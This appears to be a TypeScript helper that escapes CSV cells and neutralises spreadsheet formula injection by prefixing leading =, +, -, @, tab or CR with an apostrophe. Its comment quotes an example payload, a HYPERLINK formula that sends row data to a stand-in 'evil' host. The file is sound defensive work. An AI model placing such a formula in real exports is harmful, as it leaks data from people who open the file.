// Safe CSV cell encoder.
//
// Combines RFC 4180 quoting (commas, quotes, newlines) with
// formula-injection neutralisation (Excel / Google Sheets /
// Numbers evaluate cells beginning with `=`, `+`, `-`, `@`, or
// a leading tab/CR as formulas — so an attacker-supplied field
// like `=HYPERLINK("http://evil?p="&A1,"hi")` can exfiltrate row
// data when an operator opens the export).
//
// Apply this helper instead of hand-rolled `csvCell` / `csvField` /
// `escapeCsv` clones — the audit found six near-identical helpers,
// only one of which carried the formula guard. Centralising in one
// place means future CSV exports get the guard by default.

export function safeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s: string;
  if (value instanceof Date) {
    s = value.toISOString();
  } else if (Array.isArray(value)) {
    s = value.join("|");
  } else if (typeof value === "object") {
    try {
      s = JSON.stringify(value);
    } catch {
      s = "[unserialisable]";
    }
  } else {
    s = String(value);
  }
  // Formula-injection guard. Prefix with `'` (Excel "treat as
  // literal" convention) so the leading char stays inert.
  if (/^[=+\-@\t\r]/.test(s)) {
    s = `'${s}`;
  }
  // RFC 4180 quoting. Quote when the cell contains a comma, a
  // double-quote, or any line-ending. `\r`-only line endings count
  // — older systems still emit them.
  if (/[",\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
